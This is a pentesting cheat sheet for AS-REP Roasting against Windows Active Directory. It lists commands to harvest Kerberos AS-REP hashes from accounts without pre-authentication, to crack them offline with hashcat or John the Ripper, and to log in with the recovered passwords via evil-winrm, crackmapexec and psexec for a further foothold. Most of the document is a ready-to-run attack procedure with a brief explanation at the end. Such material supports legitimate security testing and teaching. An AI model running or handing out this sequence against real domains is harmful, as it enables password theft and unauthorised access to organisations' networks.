AS-REP Roasting - Cheat Sheet

Target domain accounts that have Kerberos pre-authentication disabled.
Those accounts respond to an unauthenticated AS-REQ with an encrypted blob
that can be cracked offline - no domain credentials required to start.
Replace the placeholders (<...>) with your own values.


Step 1 - Find accounts with pre-auth disabled

Option A - from Kali with valid domain credentials:

    GetNPUsers.py <domain>/<username>:<password> -dc-ip <dc-ip> -request

Option B - from Kali with no credentials (needs a username list):

    GetNPUsers.py <domain>/ -dc-ip <dc-ip> -usersfile <userlist-file> -no-pass -request

The tool sends an AS-REQ for each account. Accounts with pre-auth disabled
reply with an AS-REP that contains an encrypted timestamp - that's your hash.

Output hash format:  $krb5asrep$23$<username>@<domain>:...


Step 2 - Save the hashes to a file

Pipe the output or use -outputfile:

    GetNPUsers.py <domain>/ -dc-ip <dc-ip> -usersfile <userlist-file> \
        -no-pass -request -outputfile <hash-file>


Step 3 - Crack the hashes offline

Option A - hashcat (mode 18200):

    hashcat -m 18200 <hash-file> <wordlist-path> --force

Option B - John the Ripper:

    john --format=krb5asrep --wordlist=<wordlist-path> <hash-file>

A successful crack gives you the plaintext password of the vulnerable account.


Step 4 - Use the cracked credentials

Authenticate with the recovered plaintext password:
  - evil-winrm -i <target-ip> -u <username> -p <password>
  - crackmapexec smb <target-ip> -u <username> -p <password>
  - psexec.py / wmiexec.py <domain>/<username>:<password>@<target-ip>

If the account has domain privileges, also check for further Kerberoastable
SPNs or delegation rights from this new foothold.


(optional) Restore Kali's networking

Only needed if you manually set a static IP before the attack:

    sudo nmcli con mod "<connection name>" ipv4.method auto
    sudo nmcli con up "<connection name>"


Key idea: normally Kerberos requires a client to prove knowledge of their
password before the DC issues a ticket (pre-authentication). When that check
is turned off on an account, anyone can ask the DC for a ticket and get back
an encrypted blob - no password needed. That blob is crackable offline.
Accounts with pre-auth disabled are often service or legacy accounts.
